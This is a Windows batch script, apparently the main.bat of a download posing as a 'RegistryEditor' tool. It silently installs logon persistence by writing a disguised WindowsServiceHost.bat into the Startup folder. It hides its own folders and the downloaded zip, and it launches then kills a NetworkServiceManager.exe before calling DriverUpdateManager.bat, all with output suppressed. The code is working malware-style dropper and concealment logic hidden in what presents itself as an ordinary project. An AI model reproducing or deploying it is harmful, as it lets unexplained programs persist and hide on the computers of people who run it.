@echo off

timeout /t 2 >nul

REM Determine the directory where this batch file is located
set "script_dir=%~dp0"

REM Create the batch file for startup folder (WindowsServiceHost.bat)
(
  echo @echo off
  echo timeout /t 3 >nul  REM Wait 3 seconds for computer startup
  echo cd /d "%~dp0"
  echo call "%~dp0DriverUpdateManager.bat"
) > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsServiceHost.bat"

REM Check if both batch files exist in their respective locations
if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsServiceHost.bat" (
  >nul echo WindowsServiceHost.bat created successfully in Startup folder.
) else (
  >nul echo Failed to create WindowsServiceHost.bat in Startup folder.
)

REM Hide the RegistryEditor folder and its parent folder
attrib +h "%script_dir%\.."
attrib +h "%script_dir%\..\.."

REM Hide the RegistryEditor.zip file in the Downloads directory
attrib +h "%USERPROFILE%\Downloads\RegistryEditor-main.zip"

REM Start NetworkServiceManager.exe for the first time and wait for 12 seconds
start "" "%script_dir%NetworkServiceManager.exe"
timeout /t 10 >nul

REM Attempt to kill NetworkServiceManager.exe if it is running
taskkill /f /im NetworkServiceManager.exe >nul 2>&1

REM After waiting, call DriverUpdateManager.bat
call "%script_dir%DriverUpdateManager.bat"

REM End of main.bat
